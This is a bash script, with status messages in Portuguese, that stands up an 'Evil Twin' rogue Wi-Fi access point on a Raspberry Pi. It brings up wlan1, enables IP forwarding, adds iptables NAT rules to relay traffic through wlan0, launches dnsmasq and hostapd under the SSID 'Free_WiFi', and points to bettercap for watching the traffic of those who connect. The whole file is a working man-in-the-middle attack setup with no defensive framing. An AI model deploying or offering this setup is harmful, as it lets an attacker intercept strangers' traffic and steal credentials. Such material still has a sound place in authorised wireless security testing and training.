#!/bin/bash

echo "========================================"
echo "       EVIL TWIN - Raspberry Pi        "
echo "========================================"

echo "[*] A configurar wlan1..."
sudo ip addr flush dev wlan1
sudo ip addr add 192.168.4.1/24 dev wlan1
sudo ip link set wlan1 up

echo "[*] A ativar IP forwarding..."
sudo sysctl -w net.ipv4.ip_forward=1

echo "[*] A configurar iptables..."
sudo iptables -t nat -F
sudo iptables -F FORWARD
sudo iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
sudo iptables -A FORWARD -i wlan1 -o wlan0 -j ACCEPT
sudo iptables -A FORWARD -i wlan0 -o wlan1 -m state --state RELATED,ESTABLISHED -j ACCEPT

echo "[*] A iniciar dnsmasq..."
sudo dnsmasq -C /etc/dnsmasq.conf &
sleep 2

echo "[*] A iniciar hostapd..."
sudo hostapd /etc/hostapd/hostapd.conf &
sleep 2

echo ""
echo "[+] Evil Twin ATIVO!"
echo "[+] SSID: Free_WiFi"
echo "[+] IP do AP: 192.168.4.1"
echo ""
echo "[*] Para monitorizar: sudo bettercap -iface wlan1"
echo "[*] Para parar: ./stop-eviltwin.sh"
